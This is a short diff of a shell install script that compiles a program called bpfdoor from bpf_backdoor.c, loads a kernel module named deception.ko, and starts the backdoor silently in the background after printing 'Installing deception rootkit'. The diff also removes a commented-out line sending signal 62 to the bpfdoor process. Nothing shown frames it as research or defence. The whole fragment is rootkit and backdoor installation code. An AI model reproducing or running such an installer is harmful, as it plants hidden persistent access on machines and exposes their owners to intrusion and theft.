@@ -6,7 +6,6 @@ printf "Installing deception rootkit...\n"
 gcc -o /usr/local/bin/bpfdoor bpf_backdoor.c
 make -s 2>/dev/null
 insmod deception.ko 
-#pgrep bpfdoor | xargs kill -62
 set +m
 /usr/local/bin/bpfdoor >/dev/null 2>&1 &
 pid=$!
